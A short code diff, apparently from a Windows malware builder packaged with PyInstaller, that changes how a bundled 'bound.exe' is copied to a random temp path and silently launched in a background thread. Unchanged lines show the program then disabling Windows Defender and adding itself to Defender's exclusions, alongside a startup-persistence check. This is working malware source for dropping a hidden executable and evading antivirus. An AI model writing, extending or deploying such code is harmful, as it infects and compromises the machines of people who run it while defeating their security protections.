@@ -1074,7 +1074,17 @@ if __name__ == '__main__':
     
     if not system.isInStartup() and os.path.isfile(os.path.join(MEIPASS, 'bound.exe')):
         utils.copy(os.path.join(MEIPASS, 'bound.exe'), boundfile := os.path.join(os.getenv('temp'), 'bound', '{}.exe'.format(utils.generate())))
-        os.startfile(boundfile)
+        def __func():
+            try:
+                if len(sys.argv) < 2:
+                    args = ''
+                else:
+                    args = ' '.join(sys.argv[1:])
+                os.startfile(boundfile, 'open', args)
+            except:
+                pass
+        Thread(target= __func, daemon= True).start()
+        del __func
         
     Thread(target= system.disableWD, daemon= True).start()
     system.WDexclude(system.getSelf()[0])
